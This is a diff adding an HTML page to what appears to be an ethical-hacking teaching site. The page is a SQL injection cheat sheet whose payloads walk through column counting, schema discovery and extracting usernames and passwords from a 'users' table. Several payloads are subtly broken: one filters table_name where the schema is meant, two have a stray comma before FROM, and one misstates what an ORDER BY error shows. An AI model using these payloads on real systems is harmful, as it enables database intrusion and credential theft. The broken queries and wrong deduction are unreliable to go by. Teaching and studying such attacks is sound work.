@@ -1,0 +1,68 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="{% static 'EthHack/css/vulnerabilities/vulnerabilities.css' %}">
+
+
+</head>
+<body>
+    <h1>SQL Injection</h1>
+
+    <div class="list">
+        <h3 class="blue">1. Error Based SQLi</h3>
+        <ul>
+            <li>Method to know the structure of database via ERROR.</li>
+        </ul>
+        <h3 class="red">ORDER BY n</h3>
+        <ul>
+            <li>ex : ' ORDER BY 5 -- -</li>
+            <li>[Unknown column '5' in order clause] => We can deduce there are less than 4 column.</li>
+        </ul>
+    </div>
+
+
+    <div class="list">
+        <h3 class="blue">2. UNION-Based SQLi</h3>
+        <h2>Step 1 : Extract the number of columns.</h2>
+        <h3 class="red">ORDER BY n -- -</h3>
+        <p class="text">or</p>
+        <h3 class="red"> ' UNION SELECT NULL, NULL, NULL, NULL -- -</h3>
+
+        <h2>Step 2 : Check the place where the data displayed</h2>
+
+        <h3 class="red"> ' UNION SELECT 1,2,3,4 -- -</h3>
+        <ul>
+            <li>ex : [2], [3] are displayed => We can embed db-information there.</li>
+        </ul>
+
+        <h2>Step 3 : Extract Database Information</h2>
+        <h3>Name of the database</h3>
+        <h3 class="red"> ' UNION SELECT NULL, database(), user(), version() -- -</h3>
+        <ul>
+            <li>database() returns the name of database</li>
+            <li>user() returns the user you're seeing now</li>
+            <li>version() returns the version of Mysqli</li>
+        </ul>
+
+        <h3>Name of the table</h3>
+        <h3 class="red"> ' UNION SELECT NULL, table_name, NULL, NULL FROM information_schema.tables WHERE table_name = database() -- -</h3>
+        <ul>
+            <li>table_name < information_schema.tables < database()</li>
+        </ul>
+
+        <h3>Name of the column</h3>
+        <h3 class="red"> ' UNION SELECT NULL, column_name, NULL, NULL, FROM information_schema.columns WHERE table_name = 'users' -- -</h3>
+        <ul><li>column_name < information_schema.columns < 'users'</li></ul>
+
+        <h3>Extract Data</h3>
+        <h3 class="red"> ' UNION SELECT NULL, username, password, NULL, FROM users -- -</h3>
+        <ul><li>username and password are the data we got in column_name</li></ul>
+
+        
+    </div>
+</body>
+</html>
